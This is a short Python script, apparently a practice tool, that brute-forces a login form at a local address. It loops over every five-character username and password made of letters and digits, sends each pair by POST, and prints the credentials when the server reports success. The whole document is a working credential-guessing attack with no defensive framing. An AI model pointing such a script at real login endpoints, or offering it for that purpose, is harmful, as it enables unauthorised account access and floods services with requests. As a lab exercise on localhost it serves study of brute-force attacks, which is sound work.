from string import ascii_letters
from itertools import product
import json
import sys
from requests import post as POST

URL = 'http://127.0.0.1:5000/login1'
if __name__ == '__main__':
    success = False
    number_char = '0123456789'
    # Concatenating alphabets(lower and upper) and numbers. Also can add symbols more accuracy
    all_char = number_char + ascii_letters
    char_list = list(all_char)

    while not success:
        # for every combination of five characters,check for username and password.
        for i in product(all_char, repeat=5):
            trial_username = ''.join(i)
            for j in product(all_char, repeat=5):
                trial_password = ''.join(j)
                response = POST(URL, data={'username': trial_username, 'password': trial_password})
                success = json.loads(response.text).get('success')
                if success:
                    print(f'Username id {trial_username}\nPassword is {trial_password}')
                    sys.exit()
